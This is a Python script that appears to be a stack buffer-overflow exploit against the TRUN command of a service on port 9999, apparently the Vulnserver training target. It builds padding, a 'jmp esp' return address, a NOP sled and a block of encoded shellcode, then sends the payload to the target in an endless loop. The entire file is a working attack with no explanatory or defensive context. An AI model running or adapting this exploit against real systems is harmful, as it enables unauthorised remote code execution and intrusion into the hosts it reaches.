#!/usr/bin/python
#Adapted by Thiago Mendes da Silva
import socket, sys, time
from struct import *

rhost = '10.10.10.10'
rport = 9999
offset = 'A' * 2003
#jmp esp 625011AF
eip = "\xaf\x11\x50\x62"
esp =  b"\x90" * 8
esp += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
esp += b"\x76\x0e\xfa\xac\xd8\x7b\x83\xee\xfc\xe2\xf4\x06\x44"
esp += b"\x5a\x7b\xfa\xac\xb8\xf2\x1f\x9d\x18\x1f\x71\xfc\xe8"
esp += b"\xf0\xa8\xa0\x53\x29\xee\x27\xaa\x53\xf5\x1b\x92\x5d"
esp += b"\xcb\x53\x74\x47\x9b\xd0\xda\x57\xda\x6d\x17\x76\xfb"
esp += b"\x6b\x3a\x89\xa8\xfb\x53\x29\xea\x27\x92\x47\x71\xe0"
esp += b"\xc9\x03\x19\xe4\xd9\xaa\xab\x27\x81\x5b\xfb\x7f\x53"
esp += b"\x32\xe2\x4f\xe2\x32\x71\x98\x53\x7a\x2c\x9d\x27\xd7"
esp += b"\x3b\x63\xd5\x7a\x3d\x94\x38\x0e\x0c\xaf\xa5\x83\xc1"
esp += b"\xd1\xfc\x0e\x1e\xf4\x53\x23\xde\xad\x0b\x1d\x71\xa0"
esp += b"\x93\xf0\xa2\xb0\xd9\xa8\x71\xa8\x53\x7a\x2a\x25\x9c"
esp += b"\x5f\xde\xf7\x83\x1a\xa3\xf6\x89\x84\x1a\xf3\x87\x21"
esp += b"\x71\xbe\x33\xf6\xa7\xc4\xeb\x49\xfa\xac\xb0\x0c\x89"
esp += b"\x9e\x87\x2f\x92\xe0\xaf\x5d\xfd\x53\x0d\xc3\x6a\xad"
esp += b"\xd8\x7b\xd3\x68\x8c\x2b\x92\x85\x58\x10\xfa\x53\x0d"
esp += b"\x2b\xaa\xfc\x88\x3b\xaa\xec\x88\x13\x10\xa3\x07\x9b"
esp += b"\x05\x79\x4f\x11\xff\xc4\xd2\x71\xf0\xd6\xb0\x79\xfa"
esp += b"\xbd\x84\xf2\x1c\xc6\xc8\x2d\xad\xc4\x41\xde\x8e\xcd"
esp += b"\x27\xae\x7f\x6c\xac\x77\x05\xe2\xd0\x0e\x16\xc4\x28"
esp += b"\xce\x58\xfa\x27\xae\x92\xcf\xb5\x1f\xfa\x25\x3b\x2c"
esp += b"\xad\xfb\xe9\x8d\x90\xbe\x81\x2d\x18\x51\xbe\xbc\xbe"
esp += b"\x88\xe4\x7a\xfb\x21\x9c\x5f\xea\x6a\xd8\x3f\xae\xfc"
esp += b"\x8e\x2d\xac\xea\x8e\x35\xac\xfa\x8b\x2d\x92\xd5\x14"
esp += b"\x44\x7c\x53\x0d\xf2\x1a\xe2\x8e\x3d\x05\x9c\xb0\x73"
esp += b"\x7d\xb1\xb8\x84\x2f\x17\x38\x66\xd0\xa6\xb0\xdd\x6f"
esp += b"\x11\x45\x84\x2f\x90\xde\x07\xf0\x2c\x23\x9b\x8f\xa9"
esp += b"\x63\x3c\xe9\xde\xb7\x11\xfa\xff\x27\xae"
buffer = offset + eip + esp

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((rhost,rport))
    s.send('TRUN /.:/'+ buffer + '\r\n')
    s.recv(2048)
    s.close()

